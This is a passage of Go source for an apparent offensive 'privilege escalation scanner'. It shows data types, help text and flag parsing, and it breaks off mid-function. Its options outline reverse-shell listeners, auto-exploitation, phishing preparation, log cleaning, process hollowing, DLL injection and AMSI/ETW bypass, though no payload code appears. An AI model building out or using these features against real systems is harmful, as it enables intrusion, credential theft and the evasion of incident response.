package main

import (
	"bufio"
	"bytes"
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/olekukonko/tablewriter"
	"golang.org/x/crypto/ssh/terminal"
)

type Config struct {
	Target           string
	DeepScan         bool
	Stealth          bool
	Output           string
	AutoExploit      bool
	LHOST            string
	LPORT            int
	WebPort          int
	Module           string
	Delay            int
	Threads          int
	Timeout          int
	LogLevel         string
	CloudScan        bool
	NetworkScan      bool
	WebScan          bool
	DatabaseScan     bool
	PhishingPrep     bool
	PostExploit      bool
	IRBypass         bool
	MLEnabled        bool
	Distributed      bool
	PluginDir        string
	AWSRegion        string
	AzureTenant      string
	GCPProject       string
	KubeConfig       string
	BloodHound       bool
	DCSyncCheck      bool
	LOLBAS           bool
	AMSI             bool
	AppLocker        bool
	ETW              bool
	SELinux          bool
	Seccomp          bool
	Namespaces       bool
	eBPF             bool
	APIEndpoint      string
	APIToken         string
	MasterNode       string
	AgentMode        bool
	SMBUser          string
	SMBPassword      string
	SMBDomain        string
	Kerberos         bool
	RIDCycle         bool
	SMBSigning       bool
	SMBVersion       bool
	LSA              bool
	RateLimit        int
	RetryCount       int
	ExploitDBUpdate  bool
	CVEFeed          bool
	AuditMode        bool
	NoExploit        bool
	NoPhishing       bool
}

type GTFOBin struct {
	Binary       string   `json:"binary"`
	Functions    []string `json:"functions"`
	SUID         bool     `json:"suid"`
	Sudo         bool     `json:"sudo"`
	Capabilities bool     `json:"capabilities"`
}

type ScanResult struct {
	Binary       string     `json:"binary"`
	Path         string     `json:"path"`
	Found        bool       `json:"found"`
	SUID         bool       `json:"suid"`
	SudoAllowed  bool       `json:"sudo_allowed"`
	Capabilities []string   `json:"capabilities"`
	GTFOBins     *GTFOBin   `json:"gtfobins"`
	RiskLevel    string     `json:"risk_level"`
	Exploits     []string   `json:"exploits"`
}

type SystemInfo struct {
	OS           string `json:"os"`
	Architecture string `json:"architecture"`
	Hostname     string `json:"hostname"`
	CurrentUser  string `json:"current_user"`
	Kernel       string `json:"kernel"`
	Domain       string `json:"domain"`
}

type SMBFinding struct {
	Target        string    `json:"target"`
	NullSession   bool      `json:"null_session"`
	Shares        []SMBShare `json:"shares"`
	DomainSID     string    `json:"domain_sid"`
	Users         []SMBUser  `json:"users"`
	SMBv1         bool      `json:"smb_v1"`
	SigningRequired bool    `json:"signing_required"`
	RIDResults    []RIDEntry `json:"rid_results"`
}

type SMBShare struct {
	Name     string `json:"name"`
	Type     string `json:"type"`
	Readable bool   `json:"readable"`
	Writable bool   `json:"writable"`
	Comment  string `json:"comment"`
}

type SMBUser struct {
	SID      string   `json:"sid"`
	Name     string   `json:"name"`
	FullName string   `json:"full_name"`
	Groups   []string `json:"groups"`
}

type RIDEntry struct {
	RID  int    `json:"rid"`
	Type string `json:"type"`
	Name string `json:"name"`
}

type KerberosFinding struct {
	SPNList      []SPNEntry `json:"spn_list"`
	ASREPRoast   []string   `json:"as_rep_roast"`
	Kerberoast   []string   `json:"kerberoast"`
	PreAuth      bool       `json:"pre_auth"`
	TGT          bool       `json:"tgt"`
}

type SPNEntry struct {
	Service string `json:"service"`
	User    string `json:"user"`
	Port    string `json:"port"`
}

type WindowsPrivEsc struct {
	Users               []WindowsUser      `json:"users"`
	Groups              []WindowsGroup     `json:"groups"`
	Processes           []ProcessInfo      `json:"processes"`
	Services            []ServiceInfo      `json:"services"`
	NetworkShares       []NetworkShare     `json:"network_shares"`
	RegistryVulns       []RegistryVuln     `json:"registry_vulns"`
	UACInfo             UACInfo            `json:"uac_info"`
	TokenPrivileges     []TokenPrivilege   `json:"token_privileges"`
	DPAPIVulns          []DPAPIVuln        `json:"dpapi_vulns"`
	WSUSVulns           []WSUSVuln         `json:"wsus_vulns"`
	MSSQLTrusts         []MSSQLTrust       `json:"mssql_trusts"`
	UnquotedPaths       []UnquotedPath     `json:"unquoted_paths"`
	AlwaysInstallElevated bool             `json:"always_install_elevated"`
	ExploitSuggest      []string           `json:"exploit_suggest"`
}

type LinuxPrivEsc struct {
	SUIDBinaries        []SUIDBinary       `json:"suid_binaries"`
	SudoCommands        []SudoCommand      `json:"sudo_commands"`
	Capabilities        []CapabilityInfo   `json:"capabilities"`
	KernelExploits      []KernelExploit    `json:"kernel_exploits"`
	CronJobs            []CronJob          `json:"cron_jobs"`
	WritableFiles       []WritableFile     `json:"writable_files"`
	Processes           []LinuxProcess     `json:"processes"`
	NetworkConnections  []NetworkConn      `json:"network_connections"`
	ContainerEscapes    []ContainerEscape  `json:"container_escapes"`
	SSHKeys             []SSHKey           `json:"ssh_keys"`
	EnvVars             []EnvVar           `json:"env_vars"`
	ExploitSuggest      []string           `json:"exploit_suggest"`
}

type ActiveDirectory struct {
	Domain          string            `json:"domain"`
	DomainSID       string            `json:"domain_sid"`
	DomainControllers []string         `json:"domain_controllers"`
	Users           []ADUser          `json:"users"`
	Groups          []ADGroup         `json:"groups"`
	Computers       []ADComputer      `json:"computers"`
	GPOs            []GPO             `json:"gpos"`
	Trusts          []ADTrust         `json:"trusts"`
	BloodHoundData  BloodHoundData    `json:"bloodhound_data"`
	DCSyncVulns     []DCSyncVuln      `json:"dcsync_vulns"`
	ACLs            []ACL             `json:"acls"`
}

type CloudScanner struct {
	AWSResults     []AWSFinding     `json:"aws"`
	AzureResults   []AzureFinding   `json:"azure"`
	GCPResults     []GCPFinding     `json:"gcp"`
	K8sResults     []K8sFinding     `json:"kubernetes"`
}

type AWSFinding struct {
	Service    string `json:"service"`
	Finding    string `json:"finding"`
	Risk       string `json:"risk"`
	Exploit    string `json:"exploit"`
}

type AzureFinding struct {
	Service    string `json:"service"`
	Finding    string `json:"finding"`
	Risk       string `json:"risk"`
	Exploit    string `json:"exploit"`
}

type GCPFinding struct {
	Service    string `json:"service"`
	Finding    string `json:"finding"`
	Risk       string `json:"risk"`
	Exploit    string `json:"exploit"`
}

type K8sFinding struct {
	Resource   string `json:"resource"`
	Finding    string `json:"finding"`
	Risk       string `json:"risk"`
	Exploit    string `json:"exploit"`
}

type NetworkScanner struct {
	ARPCache      []ARPEntry        `json:"arp_cache"`
	DNSRecords    []DNSRecord       `json:"dns_records"`
	SNMPFindings  []SNMPFinding     `json:"snmp_findings"`
	LDPFindings   []LDPFinding      `json:"ldap_findings"`
	SMBFindings   []SMBFinding      `json:"smb_findings"`
	KerberosInfo  []KerberosFinding `json:"kerberos_findings"`
}

type ARPEntry struct {
	IP    string `json:"ip"`
	MAC   string `json:"mac"`
	Iface string `json:"interface"`
}

type DNSRecord struct {
	Type  string `json:"type"`
	Name  string `json:"name"`
	Value string `json:"value"`
}

type SNMPFinding struct {
	Target    string `json:"target"`
	Community string `json:"community"`
	Access    string `json:"access"`
}

type LDPFinding struct {
	Server   string `json:"server"`
	Auth     string `json:"auth"`
	Access   string `json:"access"`
}

type WebAppScanner struct {
	JWTIssues     []JWTVuln         `json:"jwt_vulns"`
	APIVulns      []APIVuln         `json:"api_vulns"`
	XSSVulns      []XSSVuln         `json:"xss_vulns"`
	SQLIVulns     []SQLIVuln        `json:"sqli_vulns"`
	UploadVulns   []UploadVuln      `json:"upload_vulns"`
}

type JWTVuln struct {
	Endpoint string `json:"endpoint"`
	Issue    string `json:"issue"`
	Risk     string `json:"risk"`
	Exploit  string `json:"exploit"`
}

type APIVuln struct {
	Endpoint string `json:"endpoint"`
	Issue    string `json:"issue"`
	Risk     string `json:"risk"`
	Exploit  string `json:"exploit"`
}

type XSSVuln struct {
	URL     string `json:"url"`
	Vector  string `json:"vector"`
	Risk    string `json:"risk"`
	Exploit string `json:"exploit"`
}

type SQLIVuln struct {
	URL     string `json:"url"`
	Vector  string `json:"vector"`
	Risk    string `json:"risk"`
	Exploit string `json:"exploit"`
}

type UploadVuln struct {
	URL     string `json:"url"`
	Method  string `json:"method"`
	Risk    string `json:"risk"`
	Exploit string `json:"exploit"`
}

type DatabaseScanner struct {
	MySQLVulns    []DBVuln `json:"mysql_vulns"`
	PostgresVulns []DBVuln `json:"postgres_vulns"`
	MongoDBVulns  []DBVuln `json:"mongodb_vulns"`
	RedisVulns    []DBVuln `json:"redis_vulns"`
}

type DBVuln struct {
	Type    string `json:"type"`
	Issue   string `json:"issue"`
	Risk    string `json:"risk"`
	Exploit string `json:"exploit"`
}

type PhishingPreparer struct {
	SSHPages      []PhishingPage `json:"ssh_pages"`
	RDPPages      []PhishingPage `json:"rdp_pages"`
	UpdateTraps   []UpdateTrap   `json:"update_traps"`
	SETools       []SETool       `json:"se_tools"`
}

type PhishingPage struct {
	Type    string `json:"type"`
	URL     string `json:"url"`
	Creds   string `json:"credentials"`
}

type UpdateTrap struct {
	Type    string `json:"type"`
	Payload string `json:"payload"`
	Target  string `json:"target"`
}

type SETool struct {
	Name    string `json:"name"`
	Type    string `json:"type"`
	Payload string `json:"payload"`
}

type PostExploitFramework struct {
	Metasploit   bool     `json:"metasploit"`
	CobaltStrike bool     `json:"cobalt_strike"`
	Empire       bool     `json:"empire"`
	PoshC2       bool     `json:"posh_c2"`
	Beacons      []string `json:"beacons"`
}

type IRBypass struct {
	LogCleaning   []LogCleanMethod `json:"log_cleaning"`
	ProcessHollow []PHMethod       `json:"process_hollowing"`
	DLLInjection  []DLLMethod      `json:"dll_injection"`
	MemoryEvasion []MemEvasion     `json:"memory_evasion"`
}

type LogCleanMethod struct {
	Method  string `json:"method"`
	Target  string `json:"target"`
	Success bool   `json:"success"`
}

type PHMethod struct {
	Process   string `json:"process"`
	Technique string `json:"technique"`
	Success   bool   `json:"success"`
}

type DLLMethod struct {
	DLL     string `json:"dll"`
	Target  string `json:"target"`
	Success bool   `json:"success"`
}

type MemEvasion struct {
	Technique string `json:"technique"`
	Success   bool   `json:"success"`
}

type MLIntegration struct {
	AnomalyModels []MLModel   `json:"anomaly_models"`
	AutoExploit   bool        `json:"auto_exploit"`
	RiskScoring   bool        `json:"risk_scoring"`
	Predictions   []Prediction `json:"predictions"`
}

type MLModel struct {
	Name     string  `json:"name"`
	Type     string  `json:"type"`
	Accuracy float64 `json:"accuracy"`
}

type Prediction struct {
	Vector     string  `json:"vector"`
	Risk       float64 `json:"risk_score"`
	Confidence float64 `json:"confidence"`
}

type GUI struct {
	WebEnabled bool     `json:"web_enabled"`
	RealTime   bool     `json:"real_time"`
	Reports    []string `json:"reports"`
	Dashboard  bool     `json:"dashboard"`
}

type DistributedManager struct {
	AgentMode  bool   `json:"agent_mode"`
	MasterNode string `json:"master_node"`
	Agents     []string `json:"agents"`
	Tasks      []Task `json:"tasks"`
}

type Task struct {
	ID     string `json:"id"`
	Type   string `json:"type"`
	Target string `json:"target"`
	Status string `json:"status"`
}

type PluginSystem struct {
	Plugins    []Plugin `json:"plugins"`
	APIVersion string   `json:"api_version"`
	Loaded     bool     `json:"loaded"`
}

type Plugin struct {
	Name    string `json:"name"`
	Version string `json:"version"`
	Enabled bool   `json:"enabled"`
}

type PerformanceOptimizer struct {
	ConnectionPool bool `json:"connection_pool"`
	Caching        bool `json:"caching"`
	AsyncScan      bool `json:"async_scan"`
	Throttling     bool `json:"throttling"`
}

type WindowsUser struct {
	Name     string   `json:"name"`
	SID      string   `json:"sid"`
	Groups   []string `json:"groups"`
	Admin    bool     `json:"admin"`
	Disabled bool     `json:"disabled"`
}

type WindowsGroup struct {
	Name    string   `json:"name"`
	SID     string   `json:"sid"`
	Members []string `json:"members"`
}

type ProcessInfo struct {
	PID     int    `json:"pid"`
	Name    string `json:"name"`
	User    string `json:"user"`
	Session int    `json:"session"`
	Token   string `json:"token"`
}

type ServiceInfo struct {
	Name     string `json:"name"`
	State    string `json:"state"`
	User     string `json:"user"`
	Path     string `json:"path"`
	Writable bool   `json:"writable"`
}

type NetworkShare struct {
	Name     string `json:"name"`
	Path     string `json:"path"`
	Access   string `json:"access"`
	Writable bool   `json:"writable"`
}

type RegistryVuln struct {
	Path    string `json:"path"`
	Value   string `json:"value"`
	Risk    string `json:"risk"`
	Exploit string `json:"exploit"`
}

type UACInfo struct {
	Level     int    `json:"level"`
	Enabled   bool   `json:"enabled"`
	Bypass    bool   `json:"bypass"`
	Technique string `json:"technique"`
}

type TokenPrivilege struct {
	Process   string `json:"process"`
	User      string `json:"user"`
	Privilege string `json:"privilege"`
	Risk      string `json:"risk"`
}

type DPAPIVuln struct {
	Type     string `json:"type"`
	Location string `json:"location"`
	Risk     string `json:"risk"`
}

type WSUSVuln struct {
	Server     string `json:"server"`
	Vulnerable bool   `json:"vulnerable"`
	Exploit    string `json:"exploit"`
}

type MSSQLTrust struct {
	Server  string `json:"server"`
	Trusted bool   `json:"trusted"`
	Risk    string `json:"risk"`
}

type UnquotedPath struct {
	Service  string `json:"service"`
	Path     string `json:"path"`
	Writable bool   `json:"writable"`
}

type SUIDBinary struct {
	Binary    string   `json:"binary"`
	Path      string   `json:"path"`
	Owner     string   `json:"owner"`
	RiskLevel string   `json:"risk_level"`
	Exploits  []string `json:"exploits"`
}

type SudoCommand struct {
	Command   string   `json:"command"`
	User      string   `json:"user"`
	RiskLevel string   `json:"risk_level"`
	Exploits  []string `json:"exploits"`
}

type CapabilityInfo struct {
	Binary       string   `json:"binary"`
	Capabilities []string `json:"capabilities"`
	RiskLevel    string   `json:"risk_level"`
}

type KernelExploit struct {
	CVE         string `json:"cve"`
	Description string `json:"description"`
	Risk        string `json:"risk"`
	ExploitCmd  string `json:"exploit_cmd"`
}

type CronJob struct {
	User     string `json:"user"`
	Command  string `json:"command"`
	Time     string `json:"time"`
	Writable bool   `json:"writable"`
}

type WritableFile struct {
	Path     string `json:"path"`
	Owner    string `json:"owner"`
	Writable bool   `json:"writable"`
	Risk     string `json:"risk"`
}

type LinuxProcess struct {
	PID     int    `json:"pid"`
	User    string `json:"user"`
	Command string `json:"command"`
	Risk    string `json:"risk"`
}

type NetworkConn struct {
	Protocol string `json:"protocol"`
	Local    string `json:"local"`
	Remote   string `json:"remote"`
	State    string `json:"state"`
	Process  string `json:"process"`
}

type ContainerEscape struct {
	Type    string `json:"type"`
	Risk    string `json:"risk"`
	Exploit string `json:"exploit"`
}

type SSHKey struct {
	Path     string `json:"path"`
	User     string `json:"user"`
	Writable bool   `json:"writable"`
	Risk     string `json:"risk"`
}

type EnvVar struct {
	Name  string `json:"name"`
	Value string `json:"value"`
	Risk  string `json:"risk"`
}

type ADUser struct {
	Name                 string   `json:"name"`
	SID                  string   `json:"sid"`
	Groups               []string `json:"groups"`
	Admin                bool     `json:"admin"`
	Enabled              bool     `json:"enabled"`
	PasswordNeverExpires bool     `json:"password_never_expires"`
}

type ADGroup struct {
	Name    string   `json:"name"`
	SID     string   `json:"sid"`
	Members []string `json:"members"`
}

type ADComputer struct {
	Name      string `json:"name"`
	OS        string `json:"os"`
	LastLogon string `json:"last_logon"`
}

type GPO struct {
	Name string `json:"name"`
	Path string `json:"path"`
}

type ADTrust struct {
	Domain    string `json:"domain"`
	Type      string `json:"type"`
	Direction string `json:"direction"`
}

type BloodHoundData struct {
	Users     int `json:"users"`
	Groups    int `json:"groups"`
	Computers int `json:"computers"`
	ACLs      int `json:"acls"`
}

type DCSyncVuln struct {
	User string `json:"user"`
	Risk string `json:"risk"`
}

type ACL struct {
	Object     string `json:"object"`
	Permission string `json:"permission"`
	Risk       string `json:"risk"`
}

type PrivilegeEscalationScanner struct {
	Config          *Config
	GTFOBinsDB      map[string]GTFOBin
	SystemInfo      SystemInfo
	WindowsInfo     WindowsPrivEsc
	LinuxInfo       LinuxPrivEsc
	ADInfo          ActiveDirectory
	CloudInfo       CloudScanner
	NetworkInfo     NetworkScanner
	WebAppInfo      WebAppScanner
	DBInfo          DatabaseScanner
	PhishingInfo    PhishingPreparer
	PostExploitInfo PostExploitFramework
	IRBypassInfo    IRBypass
	MLInfo          MLIntegration
	GUIInfo         GUI
	DistributedInfo DistributedManager
	PluginInfo      PluginSystem
	PerformanceInfo PerformanceOptimizer
	Results         []ScanResult
	Logs            []LogEntry
	StealthMode     *StealthMode
	ExploitDB       *ExploitDatabase
	CVEDB           *CVEDatabase
	Mutex           sync.Mutex
	RateLimiter     *time.Ticker
	ThreadPool      chan struct{}
}

type LogEntry struct {
	Timestamp time.Time
	Level     string
	Message   string
	Module    string
}

type StealthMode struct {
	Enabled bool
	Delay   time.Duration
}

type ExploitDatabase struct {
	LinuxExploits   []Exploit
	WindowsExploits []Exploit
	LastUpdated     time.Time
}

type CVEDatabase struct {
	CVEs        []CVE
	LastUpdated time.Time
}

type Exploit struct {
	ID          string
	Description string
	Platform    string
	Risk        string
	Command     string
}

type CVE struct {
	ID          string
	Description string
	Risk        string
	Affected    []string
}

func main() {
	if len(os.Args) == 1 {
		printBanner()
		printHelp()
		return
	}

	config := parseFlags()
	
	if config.AuditMode {
		config.AutoExploit = false
		config.PhishingPrep = false
		config.NoExploit = true
		config.NoPhishing = true
	}

	scanner := NewPrivilegeEscalationScanner(config)
	
	scanner.Log("INFO", "Starting Advanced Privilege Escalation Scanner (privesc)", "main")
	
	if err := scanner.LoadGTFOBinsDB(); err != nil {
		scanner.Log("ERROR", fmt.Sprintf("Error loading GTFOBins database: %v", err), "main")
		return
	}
	
	if config.ExploitDBUpdate {
		scanner.UpdateExploitDatabase()
	}
	
	if config.CVEFeed {
		scanner.UpdateCVEDatabase()
	}
	
	scanner.LoadExploitDatabase()
	scanner.LoadCVEDatabase()
	
	scanner.DetectSystemInfo()
	
	if strings.Contains(strings.ToLower(scanner.SystemInfo.OS), "windows") {
		scanner.Log("INFO", "Target: Windows System", "main")
		scanner.WindowsPrivilegeEscalationScan()
		if config.DeepScan {
			scanner.ActiveDirectoryScan()
		}
	} else {
		scanner.Log("INFO", "Target: Linux/Unix System", "main")
		scanner.LinuxPrivilegeEscalationScan()
	}
	
	if config.CloudScan {
		scanner.CloudPrivilegeEscalationScan()
	}
	
	if config.NetworkScan {
		scanner.NetworkDiscoveryScan()
	}
	
	if config.WebScan {
		scanner.WebApplicationSecurityScan()
	}
	
	if config.DatabaseScan {
		scanner.DatabaseSecurityScan()
	}
	
	if config.PhishingPrep && !config.NoPhishing {
		if scanner.ConfirmAction("Phishing preparation") {
			scanner.PhishingPreparation()
		}
	}
	
	if config.PostExploit {
		scanner.PostExploitationIntegration()
	}
	
	if config.IRBypass {
		scanner.IncidentResponseBypass()
	}
	
	if config.MLEnabled {
		scanner.MachineLearningIntegration()
	}
	
	if config.AutoExploit && !config.NoExploit {
		if scanner.ConfirmAction("Auto-exploitation") {
			scanner.AutoExploit()
		} else {
			scanner.Log("WARNING", "Auto-exploit cancelled by user", "main")
			config.AutoExploit = false
		}
	}
	
	if config.WebPort > 0 {
		scanner.StartWebInterface()
	}
	
	if config.Distributed {
		scanner.StartDistributedMode()
	}
	
	scanner.GenerateComprehensiveReport()
	scanner.SaveLogs()
	scanner.Cleanup()
}

func printBanner() {
	banner := `
██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
██████╔╝██████╔╝██║██║   ██║█████╗  █████╗  ██║     
██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ██╔══╝  ██║     
██║     ██║  ██║██║ ╚████╔╝ ███████╗███████╗╚██████╗
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
                                                     
Advanced Privilege Escalation Scanner v2.1
`
	fmt.Println(banner)
}

func printHelp() {
	fmt.Println("USAGE:")
	fmt.Println("  privesc [OPTIONS]")
	fmt.Println("")
	fmt.Println("OPTIONS:")
	fmt.Println("  -target string        Target host to scan (default: localhost)")
	fmt.Println("  -deep                 Deep scan mode")
	fmt.Println("  -stealth              Stealth mode")
	fmt.Println("  -output string        Output file (default: privilege_escalation_report.json)")
	fmt.Println("  -exploit              Auto-exploit mode")
	fmt.Println("  -lhost string         Listener host for reverse shells")
	fmt.Println("  -lport int            Listener port for reverse shells (default: 4444)")
	fmt.Println("  -web int              Web interface port")
	fmt.Println("  -module string        Specific module to run (default: all)")
	fmt.Println("  -delay int            Delay between requests in ms (default: 100)")
	fmt.Println("  -threads int          Number of threads (default: 10)")
	fmt.Println("  -timeout int          Timeout in seconds (default: 30)")
	fmt.Println("  -loglevel string      Log level (default: INFO)")
	fmt.Println("  -audit                Audit mode (disables auto-exploit and phishing)")
	fmt.Println("  -no-exploit           Disable exploitation features")
	fmt.Println("  -no-phishing          Disable phishing features")
	fmt.Println("")
	fmt.Println("SMB/RPC ENUMERATION:")
	fmt.Println("  -smbuser string       SMB username")
	fmt.Println("  -smbpass string       SMB password")
	fmt.Println("  -smbdomain string     SMB domain")
	fmt.Println("  -kerberos             Enable Kerberos enumeration")
	fmt.Println("  -ridcycle             Enable RID cycling")
	fmt.Println("  -smbsigning           Check SMB signing")
	fmt.Println("  -smbversion           Check SMB version")
	fmt.Println("  -lsa                  Check LSA secrets")
	fmt.Println("")
	fmt.Println("CLOUD SCANNING:")
	fmt.Println("  -cloud                Enable cloud scanning (AWS, Azure, GCP, Kubernetes)")
	fmt.Println("  -aws-region string    AWS region (default: us-east-1)")
	fmt.Println("  -azure-tenant string  Azure tenant ID")
	fmt.Println("  -gcp-project string   GCP project ID")
	fmt.Println("  -kubeconfig string    Kubeconfig file path")
	fmt.Println("")
	fmt.Println("NETWORK SCANNING:")
	fmt.Println("  -network              Enable network scanning")
	fmt.Println("")
	fmt.Println("WEB APPLICATION SCANNING:")
	fmt.Println("  -webscan              Enable web application security scanning")
	fmt.Println("")
	fmt.Println("DATABASE SCANNING:")
	fmt.Println("  -dbscan               Enable database security scanning")
	fmt.Println("")
	fmt.Println("ACTIVE DIRECTORY:")
	fmt.Println("  -bloodhound           Collect BloodHound data")
	fmt.Println("  -dcsync               Check DCSync vulnerabilities")
	fmt.Println("")
	fmt.Println("WINDOWS ENHANCEMENTS:")
	fmt.Println("  -lolbas               Scan for LOLBAS binaries")
	fmt.Println("  -amsi                 Check AMSI bypass possibilities")
	fmt.Println("  -applocker            Check AppLocker/WDAC bypasses")
	fmt.Println("  -etw                  Check ETW bypass possibilities")
	fmt.Println("")
	fmt.Println("LINUX ENHANCEMENTS:")
	fmt.Println("  -selinux              Check SELinux bypass vectors")
	fmt.Println("  -seccomp              Check Seccomp filter escapes")
	fmt.Println("  -namespaces           Check namespace escape vectors")
	fmt.Println("  -ebpf                 Check eBPF vulnerabilities")
	fmt.Println("")
	fmt.Println("PHISHING PREPARATION:")
	fmt.Println("  -phishing             Prepare phishing campaigns")
	fmt.Println("")
	fmt.Println("POST-EXPLOITATION:")
	fmt.Println("  -postexploit          Integrate with post-exploitation frameworks")
	fmt.Println("")
	fmt.Println("INCIDENT RESPONSE BYPASS:")
	fmt.Println("  -irbypass             Check IR bypass techniques")
	fmt.Println("")
	fmt.Println("MACHINE LEARNING:")
	fmt.Println("  -ml                   Enable ML/AI features")
	fmt.Println("")
	fmt.Println("DISTRIBUTED SCANNING:")
	fmt.Println("  -distributed          Enable distributed scanning mode")
	fmt.Println("  -master string        Master node address")
	fmt.Println("  -agent                Run in agent mode")
	fmt.Println("")
	fmt.Println("PLUGIN SYSTEM:")
	fmt.Println("  -plugins string       Plugin directory")
	fmt.Println("")
	fmt.Println("PERFORMANCE:")
	fmt.Println("  -ratelimit int        Rate limit requests per second (default: 10)")
	fmt.Println("  -retry int            Number of retries for failed requests (default: 3)")
	fmt.Println("  -exploitdb-update     Update exploit database")
	fmt.Println("  -cve-feed             Update CVE database")
	fmt.Println("")
	fmt.Println("EXAMPLES:")
	fmt.Println("  privesc -target 192.168.1.100 -deep -cloud -network")
	fmt.Println("  privesc -web 8080 -output comprehensive_report.json")
	fmt.Println("  privesc -agent -master http://192.168.1.50:8080")
	fmt.Println("  privesc -audit -no-exploit -no-phishing")
	fmt.Println("")
}

func parseFlags() *Config {
	config := &Config{}
	
	flag.StringVar(&config.Target, "target", "localhost", "Target host to scan")
	flag.BoolVar(&config.DeepScan, "deep", false, "Deep scan mode")
	flag.BoolVar(&config.Stealth, "stealth", false, "Stealth mode")
	flag.StringVar(&config.Output, "output", "privilege_escalation_report.json", "Output file")
	flag.BoolVar(&config.AutoExploit, "exploit", false, "Auto-exploit mode")
	flag.StringVar(&config.LHOST, "lhost", "", "Listener host for reverse shells")
	flag.IntVar(&config.LPORT, "lport", 4444, "Listener port for reverse shells")
	flag.IntVar(&config.WebPort, "web", 0, "Web interface port")
	flag.StringVar(&config.Module, "module", "all", "Specific module to run")
	flag.IntVar(&config.Delay, "delay", 100, "Delay between requests in ms")
	flag.IntVar(&config.Threads, "threads", 10, "Number of threads")
	flag.IntVar(&config.Timeout, "timeout", 30, "Timeout in seconds")
	flag.StringVar(&config.LogLevel, "loglevel", "INFO", "Log level")
	flag.BoolVar(&config.AuditMode, "audit", false, "Audit mode")
	flag.BoolVar(&config.NoExploit, "no-exploit", false, "Disable exploitation")
	flag.BoolVar(&config.NoPhishing, "no-phishing", false, "Disable phishing")
	
	flag.StringVar(&config.SMBUser, "smbuser", "", "SMB username")
	flag.StringVar(&config.SMBPassword, "smbpass", "", "SMB password")
	flag.StringVar(&config.SMBDomain, "smbdomain", "", "SMB domain")
	flag.BoolVar(&config.Kerberos, "kerberos", false, "Enable Kerberos enumeration")
	flag.BoolVar(&config.RIDCycle, "ridcycle", false, "Enable RID cycling")
	flag.BoolVar(&config.SMBSigning, "smbsigning", false, "Check SMB signing")
	flag.BoolVar(&config.SMBVersion, "smbversion", false, "Check SMB version")
	flag.BoolVar(&config.LSA, "lsa", false, "Check LSA secrets")
	
	flag.BoolVar(&config.CloudScan, "cloud", false, "Enable cloud scanning")
	flag.StringVar(&config.AWSRegion, "aws-region", "us-east-1", "AWS region")
	flag.StringVar(&config.AzureTenant, "azure-tenant", "", "Azure tenant ID")
	flag.StringVar(&config.GCPProject, "gcp-project", "", "GCP project ID")
	flag.StringVar(&config.KubeConfig, "kubeconfig", "", "Kubeconfig file path")
	
	flag.BoolVar(&config.NetworkScan, "network", false, "Enable network scanning")
	flag.BoolVar(&config.WebScan, "webscan", false, "Enable web application security scanning")
	flag.BoolVar(&config.DatabaseScan, "dbscan", false, "Enable database security scanning")
	
	flag.BoolVar(&config.BloodHound, "bloodhound", false, "Collect BloodHound data")
	flag.BoolVar(&config.DCSyncCheck, "dcsync", false, "Check DCSync vulnerabilities")
	
	flag.BoolVar(&config.LOLBAS, "lolbas", false, "Scan for LOLBAS binaries")
	flag.BoolVar(&config.AMSI, "amsi", false, "Check AMSI bypass possibilities")
	flag.BoolVar(&config.AppLocker, "applocker", false, "Check AppLocker/WDAC bypasses")
	flag.BoolVar(&config.ETW, "etw", false, "Check ETW bypass possibilities")
	
	flag.BoolVar(&config.SELinux, "selinux", false, "Check SELinux bypass vectors")
	flag.BoolVar(&config.Seccomp, "seccomp", false, "Check Seccomp filter escapes")
	flag.BoolVar(&config.Namespaces, "namespaces", false, "Check namespace escape vectors")
	flag.BoolVar(&config.eBPF, "ebpf", false, "Check eBPF vulnerabilities")
	
	flag.BoolVar(&config.PhishingPrep, "phishing", false, "Prepare phishing campaigns")
	flag.BoolVar(&config.PostExploit, "postexploit", false, "Integrate with post-exploitation frameworks")
	flag.BoolVar(&config.IRBypass, "irbypass", false, "Check IR bypass techniques")
	flag.BoolVar(&config.MLEnabled, "ml", false, "Enable ML/AI features")
	
	flag.BoolVar(&config.Distributed, "distributed", false, "Enable distributed scanning mode")
	flag.StringVar(&config.MasterNode, "master", "", "Master node address")
	flag.BoolVar(&config.AgentMode, "agent", false, "Run in agent mode")
	
	flag.StringVar(&config.PluginDir, "plugins", "", "Plugin directory")
	
	flag.IntVar(&config.RateLimit, "ratelimit", 10, "Rate limit requests per second")
	flag.IntVar(&config.RetryCount, "retry", 3, "Number of retries for failed requests")
	flag.BoolVar(&config.ExploitDBUpdate, "exploitdb-update", false, "Update exploit database")
	flag.BoolVar(&config.CVEFeed, "cve-feed", false, "Update CVE database")
	
	flag.Parse()
	return config
}

func NewPrivilegeEscalationScanner(config *Config) *PrivilegeEscalationScanner {
	rateLimit := time.Second / time.Duration(config.RateLimit)
	scanner := &PrivilegeEscalationScanner{
		Config:      config,
		GTFOBinsDB:  make(map[string]GTFOBin),
		Results:     []ScanResult{},
		Logs:        []LogEntry{},
		StealthMode: &StealthMode{Enabled: config.Stealth, Delay: time.Duration(config.Delay) * time.Millisecond},
		RateLimiter: time.NewTicker(rateLimit),
		ThreadPool:  make(chan struct{}, config.Threads),
	}
	
	return scanner
}

func (s *PrivilegeEscalationScanner) Log(level, message, module string) {
	entry := LogEntry{
		Timestamp: time.Now(),
		Level:     level,
		Message:   message,
		Module:    module,
	}
	
	s.Mutex.Lock()
	s.Logs = append(s.Logs, entry)
	s.Mutex.Unlock()
	
	if level == "ERROR" || s.Config.LogLevel == "DEBUG" || s.Config.LogLevel == "INFO" {
		fmt.Printf("[%s] %s: %s\n", level, module, message)
	}
}

func (s *PrivilegeEscalationScanner) ConfirmAction(action string) bool {
	if s.Config.AuditMode {
		return false
	}
	
	fmt.Printf("\n⚠️  Confirm %s? (y/N): ", action)
	reader := bufio.NewReader(os.Stdin)
	response, _ := reader.ReadString('\n')
	response = strings.TrimSpace(strings.ToLower(response))
	return response == "y" || response == "yes"
}

func (s *PrivilegeEscalationScanner) DetectSystemInfo() {
	s.SystemInfo.OS = runtime.GOOS
	s.SystemInfo.Architecture = runtime.GOARCH
	
	if hostname, err := os.Hostname(); err == nil {
		s.SystemInfo.Hostname = hostname
	}
	
	s.SystemInfo.CurrentUser = os.Getenv("USER")
	if s.SystemInfo.CurrentUser == "" {
